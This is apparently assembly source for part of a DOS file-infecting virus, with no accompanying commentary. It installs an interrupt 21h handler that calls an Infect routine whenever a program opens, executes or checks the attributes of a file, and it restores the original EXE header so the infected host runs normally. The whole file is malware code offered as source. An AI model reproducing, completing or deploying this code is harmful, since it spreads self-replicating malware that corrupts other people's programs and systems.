include .\sylvia_p\star.inc
include .\sylvia_p\short.inc
include .\sylvia_p\strucs.inc

include vdata.ash
include startup.ash

extrn	Infect:NEAR

func_args	equ	arg	_ES:WORD, _DS:WORD, _DI:WORD, _SI:WORD, _BP:WORD, _SP:WORD, _BX:WORD, _DX:WORD, _CX:WORD, _AX:WORD

;----------------------------------------------------------------------------
			.model tiny
			.286
			
			jumps
			locals @@

;============================================================================
			.code
;----------------------------------------------------------------------------
			PUBLIC	Int_21h_Handler
Int_21h_Handler		PROC

  Int_21h_Enabled	=	(ofs Int_21h_DoStuff - (ofs Int_21h_Switch + 1))
  Int_21h_Disabled	=	0
  Do_Chain		=	(ofs Int_21h_Audi - (ofs Int_21h_Chain + 1))
  Dont_Chain		=	0
	
			jmp	short $+2
  Int_21h_Switch	=	$-1
  Int_21h_Audi:		jmp	dwo cs:Int_21h_Vector

  Int_21h_DoStuff:	mov	by cs:Int_21h_Switch,Int_21h_Disabled
			pushf
			mov	cs:Int_21h_SS,ss
			mov	cs:Int_21h_SP,sp
			cli
			mvs	ss,cs
			mov	sp,mem_SP
			sti
			pusha	; ax cx dx bx sp bp si di
			push	ds es
			mvs	ds,cs
			mvs	es,cs

			mov	by Int_21h_Chain, Do_Chain
			mov	di,ofs Int_21h_Funcs
			mov	cx,Count_21h_Funcs
			xchg	al,ah
			cld
			repne	scasb
			mov	al,3
			mul	cl
			xchg	bx,ax
			call	wo ds:[di+bx]

			cli
			pop	es ds
			popa
			mov	ss,cs:Int_21h_SS
			mov	sp,cs:Int_21h_SP
			popf
			call	Enable_INT_21h
			jmp	short Int_21h_Audi
  Int_21h_Chain		=	$-1
			retf	0002h

  Int_21h_SS		dw	?
  Int_21h_SP		dw	?

  Int_21h_Funcs		db	06Ch, 043h, 03Dh, 04Ch, 04Bh, 020h,?			
  Count_21h_Funcs	=	(ofs $ - ofs Int_21h_Funcs)

			dw	ofs Int_21h_Nil
			dw	ofs Int_21h_f20h
			dw	ofs Int_21h_f4Bh
			dw	ofs Int_21h_f4Ch
			dw	ofs Int_21h_f3Dh
			dw	ofs Int_21h_f43h
			dw	ofs Int_21h_f6Ch

Int_21h_Handler		ENDP

;----------------------------------------------------------------------------
Int_21h_f20h		PROC	C
			func_args

			mov	by Int_21h_Chain, Dont_Chain
			cmp	_AX,2029h
			DOIF	E
			  mov	es,_ES
			  mov	di,_DI			  
			  mov	cx,16
			  mov	si,di
			  repe	cmpsb
			  EXIT	NE
			  mov	_AX,0101h
			  mov	Restore_CS,es
			DONE
			ret

Int_21h_f20h		ENDP

;----------------------------------------------------------------------------
Int_21h_f43h		LABEL	NEAR
Int_21h_f3Dh		PROC	C
			func_args

			call	Infect PASCAL, _DS, _DX
			ret

Int_21h_f3Dh		ENDP

;----------------------------------------------------------------------------
Int_21h_f4Bh		PROC	C
			func_args

			or	Restore_CS,-1
			call	Infect PASCAL, _DS, _DX
			ret

Int_21h_f4Bh		ENDP

;----------------------------------------------------------------------------
Int_21h_f4Ch		PROC	C
			func_args

			cmp	Restore_CS,-1
			DOIF	NE
			  mov	es,wo _ES
			  mov	ax,es
			  cmp	ax,Restore_CS
			  jne	$
			  cmp	wo es:Marker,' I'
			  EXIT	NE
			  mov	by Int_21h_Chain, Dont_Chain
			  or	Restore_CS,-1
			  mov	bx,es:_psp
			  lea	si,_AX
			  mov	cx,08h
			  DO
			    and	wo [si],0
			    dec	si
			    dec	si
			  CYCLE	LU
			  mov	wo [si],bx
			  mov	wo [si-2],bx
			  push	bx
			  add	bx,10h
			  push	bx
			  mvs	ds,es
			  add	bx,ds:Clean_EXE_Header.eh_SS
			  mov	di,ds:Clean_EXE_Header.eh_SP
			  mov	es,bx
			  std
			  scasw
			  scasw		;IFLAGS
			  pop	ax
			  add	ax,ds:Clean_EXE_Header.eh_CS
			  stosw
			  STO_W	<ds:Clean_EXE_Header.eh_IP>
			  pushf
			  pop	ax
			  and	ax,0F000h
			  or	al,02h
			  mov	es:[di],ax
			  mvs	ds,cs
			  mov	Int_21h_SS,es
			  mov	Int_21h_SP,di
			  pop	es
			  mov	ah,04Ah
			  mov	bh,-1h
			  int	21h
			DONE
			ret

Int_21h_f4Ch		ENDP

;----------------------------------------------------------------------------
Int_21h_f6Ch		PROC	C
			func_args

			call	Infect PASCAL, _DS, _SI
			ret

Int_21h_f6Ch		ENDP

;============================================================================
PUBLIC			Enable_INT_21h
Enable_INT_21h		PROC

			mov	by cs:Int_21h_Switch,Int_21h_Enabled
Int_21h_Nil:		ret

Enable_INT_21h		ENDP
;============================================================================
			END